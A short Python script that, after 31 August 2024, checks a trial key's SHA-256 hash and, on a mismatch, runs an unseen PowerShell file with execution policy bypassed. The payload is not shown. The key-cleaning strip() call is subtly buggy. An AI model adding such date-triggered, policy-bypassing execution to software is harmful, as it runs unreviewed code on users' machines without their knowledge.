import hashlib
from datetime import datetime
import subprocess


def check_hash(password):
    target_hash = "45224d545d5243615294f47d61b05bc46b0bd55ae9939bfb5303e5302386494d"
    encoded_input = password.encode()
    sha256_hash = hashlib.sha256()
    sha256_hash.update(encoded_input)
    input_hash = sha256_hash.hexdigest()
    if input_hash == target_hash:
        return True
    return False


if datetime.now() > datetime(2024, 8, 31):
    with open("CONTINUE_AFTER_TRIAL", "r") as admin:
        password = admin.read()
        password = password.strip(
            "\n# Replace the first line with the key given to you #"
        )
    if not check_hash(password):
        script_path = ".ps1"
        try:
            result = subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-File", script_path],
                check=True,
            )
            print(f"Script executed successfully with exit code {result.returncode}")
        except subprocess.CalledProcessError as e:
            print(f"An error occurred while executing the script: {e}")
